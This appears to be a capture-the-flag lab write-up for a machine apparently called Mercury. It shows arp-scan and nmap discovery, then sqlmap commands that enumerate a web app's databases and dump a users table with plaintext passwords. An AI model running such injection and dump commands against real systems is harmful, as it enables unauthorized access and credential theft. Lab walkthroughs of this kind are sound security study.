I scan my network with:
````
sudo arp-scan -I eth1 -l
````
And the we run a nmap:
  ````
sudo nmap -sT <ip>
````
the results:
````
PORT     STATE SERVICE
22/tcp   open  ssh
8080/tcp open  http-proxy

````
I also got this: /mercuryfacts/1/ by navigating into the website.
It looks like a query for facts to mercury. I ran sqlmap to check this:

````
sqlmap -u http://IP:8080/mercuryfacts/1 --dbs 
````
from this I got
````
[INFO] fetching database names
available databases [2]:
[*] information_schema
[*] mercury

````

Then I checked for the tables inside mercury DB

````
sqlmap -u http://IP/mercuryfacts/1 -D mercury --tables  
````
````
Database: mercury
[2 tables]
+-------+
| facts |
| users |
+-------+
````
And by dumping the content of the table users I got:
````
sqlmap -u http://10.0.3.244:8080/mercuryfacts/1 -D mercury -T users --columns
[3 columns]
+----------+-------------+
| Column   | Type        |
+----------+-------------+
| id       | int         |
| password | varchar(50) |
| username | varchar(50) |
+----------+-------------+


````
````
sqlmap -u http://10.0.3.244:8080/mercuryfacts/1 -D mercury -T users --dump   
````
````
[4 entries]
+----+-------------------------------+-----------+
| id | password                      | username  |
+----+-------------------------------+-----------+
| 1  | johnny1987                    | john      |
| 2  | lovemykids111                 | laura     |
| 3  | lovemybeer111                 | sam       |
| 4  | mercuryisthesizeof0.056Earths | webmaster |
+----+-------------------------------+-----------+
````
